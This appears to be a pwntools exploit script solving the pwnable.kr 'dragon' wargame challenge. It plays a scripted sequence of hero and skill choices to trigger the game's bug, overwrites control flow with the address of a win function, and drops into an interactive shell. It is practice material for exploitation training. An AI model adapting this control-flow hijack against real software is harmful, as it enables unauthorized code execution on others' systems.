from pwn import*
p = process('./dragon')
#p = remote('pwnable.kr',9004)
win = 0x8048DBF

def hero(choice):
	p.sendlineafter('Choose Your Hero\n',str(choice))

def knight(choice):
	p.sendlineafter('HP.\n',str(choice))

def priest(choice):
	p.sendlineafter('Invincible.\n',str(choice))

hero(2)
knight(2)
hero(1)
for i in range(3):
	priest(3)	
	priest(3)
	priest(2)

p.sendline(p32(win))
p.interactive()

